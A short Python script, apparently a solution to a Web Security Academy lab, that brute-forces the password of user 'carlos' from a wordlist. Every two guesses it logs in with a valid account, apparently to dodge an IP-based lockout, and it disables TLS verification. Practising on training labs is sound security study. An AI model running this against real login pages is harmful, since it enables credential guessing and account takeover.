import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getPassword(url):
    with open('passwords.txt') as f:
        passwds = f.read().split()
    c = 0
    for p in passwds:
        if c == 2:
            data = {"username": "wiener", "password": "peter"}
            r = requests.post(url, data=data, verify=False)
            c = 0

        data = {"username": "carlos", "password": p}
        r = requests.post(url, data=data, verify=False)
        
        if 'Incorrect password' not in r.text:
            print(f'[+] {p}')
            break
        else:
            c +=1


# url = 'https://0aef00c4036fe61cc0ba4176007d00b9.web-security-academy.net/login'
# getPassword(url)